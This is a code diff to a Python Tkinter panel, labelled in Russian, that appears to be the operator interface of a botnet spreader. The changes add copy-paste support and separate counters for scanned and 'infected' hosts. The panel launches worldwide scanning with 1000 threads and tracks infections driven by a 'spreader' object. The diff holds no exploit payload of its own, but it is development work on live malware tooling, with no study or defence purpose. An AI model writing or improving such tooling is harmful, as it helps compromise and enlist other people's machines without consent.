@@ -18,10 +18,12 @@ class BotScanTab(tk.Frame):
         self.scan_target = ttk.Entry(settings_frame, width=30)
         self.scan_target.grid(row=0, column=1, padx=5)
         self.scan_target.insert(0, "192.168.1.0/24")
+        add_copy_paste_support(self.scan_target)
         ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
         self.scan_threads = ttk.Entry(settings_frame, width=10)
         self.scan_threads.grid(row=1, column=1, padx=5, sticky=tk.W)
         self.scan_threads.insert(0, "1000")
+        add_copy_paste_support(self.scan_threads)
         
         btn_frame = ttk.Frame(self)
         btn_frame.pack(fill=tk.X, padx=5, pady=5)
@@ -31,9 +33,13 @@ class BotScanTab(tk.Frame):
         ttk.Button(btn_frame, text="Копировать лог", command=self.copy_log).pack(side=tk.LEFT, padx=2)
         ttk.Button(btn_frame, text="Сохранить лог", command=self.save_log).pack(side=tk.LEFT, padx=2)
         
-        # Статистика заражений
-        self.infection_label = ttk.Label(self, text="Заражено: 0", font=('Consolas', 10, 'bold'))
-        self.infection_label.pack(anchor=tk.W, padx=5, pady=2)
+        stats_frame = ttk.Frame(self)
+        stats_frame.pack(fill=tk.X, padx=5, pady=2)
+        self.scanned_label = ttk.Label(stats_frame, text="Просканировано: 0", font=('Consolas', 9))
+        self.scanned_label.pack(side=tk.LEFT, padx=10)
+        self.infected_label = ttk.Label(stats_frame, text="Заражено: 0", font=('Consolas', 9))
+        self.infected_label.pack(side=tk.LEFT, padx=10)
+        
         self.current_ip_var = tk.StringVar(value="Ожидание...")
         ttk.Label(self, textvariable=self.current_ip_var, font=('Consolas', 10, 'bold')).pack(anchor=tk.W, padx=5)
         
@@ -58,18 +64,18 @@ class BotScanTab(tk.Frame):
         lower = message.lower()
         if 'заражён' in lower or 'success' in lower or '[+]' in lower:
             tag = 'success'
-            # Обновляем счётчик заражений
-            try:
-                infected = int(message.split(':')[-1].strip())
-                self.infection_label.config(text=f"Заражено: {infected}")
-            except:
-                pass
         elif 'fail' in lower or 'error' in lower or 'ошибка' in lower:
             tag = 'error'
         elif 'warning' in lower:
             tag = 'warning'
         self.scan_log.insert(tk.END, message + "\n", tag)
         self.scan_log.see(tk.END)
+
+    def update_stats_display(self, scanned=None, infected=None):
+        if scanned is not None:
+            self.scanned_label.config(text=f"Просканировано: {scanned}")
+        if infected is not None:
+            self.infected_label.config(text=f"Заражено: {infected}")
 
     def copy_log(self):
         self.clipboard_clear()
@@ -90,19 +96,22 @@ class BotScanTab(tk.Frame):
                 if msg.startswith("[IP]"):
                     ip = msg[4:].strip()
                     self.log_to_scan(f"Сканируется {ip}", ip=ip)
+                elif msg.startswith("[Stats]"):
+                    parts = msg.split('|')
+                    scanned_str = parts[0].split(':')[1].strip() if ':' in parts[0] else '0'
+                    infected_str = parts[1].split(':')[1].strip() if len(parts)>1 and ':' in parts[1] else '0'
+                    try:
+                        scanned = int(scanned_str)
+                        infected = int(infected_str)
+                        self.update_stats_display(scanned=scanned, infected=infected)
+                    except:
+                        pass
+                    self.log_to_scan(msg)
                 elif msg.startswith("[Progress]"):
                     try:
                         pct = int(msg.split("(")[1].split("%")[0])
                         self.progress_var.set(pct)
                     except: pass
-                elif msg.startswith("[Stats]"):
-                    # Обновляем счётчик заражений из статистики
-                    if 'Заражено:' in msg:
-                        try:
-                            infected = int(msg.split('Заражено:')[1].strip())
-                            self.infection_label.config(text=f"Заражено: {infected}")
-                        except: pass
-                    self.log_to_scan(msg)
                 else:
                     self.log_to_scan(msg)
         except queue.Empty:
@@ -115,7 +124,7 @@ class BotScanTab(tk.Frame):
         self.spreader.worker_threads = int(self.scan_threads.get())
         self.spreader.interval = 0
         self.progress_var.set(0)
-        self.infection_label.config(text="Заражено: 0")
+        self.update_stats_display(scanned=0, infected=0)
         self.log_to_scan("Запущено глобальное сканирование (уникальные IP, весь мир)")
         threading.Thread(target=self.spreader.start, daemon=True).start()
 
@@ -132,7 +141,7 @@ class BotScanTab(tk.Frame):
         else:
             targets = [target]
         self.progress_var.set(0)
-        self.infection_label.config(text="Заражено: 0")
+        self.update_stats_display(scanned=0, infected=0)
         self.log_to_scan(f"Сканирование диапазона {target} ({len(targets)} адресов)")
         self.spreader.scan_once(targets)
 
